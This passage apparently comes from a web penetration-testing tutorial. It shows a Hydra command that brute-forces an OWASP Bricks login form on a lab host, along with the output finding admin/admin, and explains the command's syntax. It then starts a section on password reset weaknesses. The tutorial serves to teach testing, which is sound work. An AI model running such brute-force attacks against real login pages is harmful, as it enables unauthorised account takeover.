```
root@kali:~/WebPentest# hydra 10.7.7.5 http-form-post "/owaspbricks/login-3/index.php:username=\"USER^&passwd=^PASS^&submit=Submit:Wrong user name or password." -L users.txt -P passwords.txt
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-26 14:16:36
[DATA] max 16 tasks per 1 server, overall 16 tasks, 60 login tries (l:6/p:10), ~4 tries per task
[DATA] attacking http-post-form://10.7.7.5:80//owaspbricks/login-3/index.php:username="USER^&passwd=^PASS^&submit=Submit:Wrong user name or password.
[80][http-post-form] host: 10.7.7.5   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-26 14:16:41
```

You may notice that the syntax in this case is slightly different than your previous use of Hydra. Let's check it out together:

+   1. First, you have the `hydra` command and the target host (`hydra 10.7.7.5`).
+   2. Then the protocol or service that you want to test (`http-form-post`).
+   3. Next comes the protocol-specific parameters in quotes (`"`) and separated with colons:
+      1. URL (`/owaspbricks/login-3/index.php`)
+      2. The body of the request, indicated by `^USER^`, where Hydra should put the usernames and `^PASS^` for the place where the passwords should go
+      3. The failed login message (`Wrong user name or password.`)
+      4. Last comes the username and password lists indicated by `-L` and `-P`

# The password reset functionality

Another common weak spot in web applications is the implementation of the password recovery and reset functionalities.

Since applications need to be user friendly, and some users forget their passwords, applications need to incorporate a way to allow these users to reset or recover their passwords. Coming up with a secure solution for this problem is not an easy task, and many developers may leave some weak link that a penetration tester or attacker can exploit.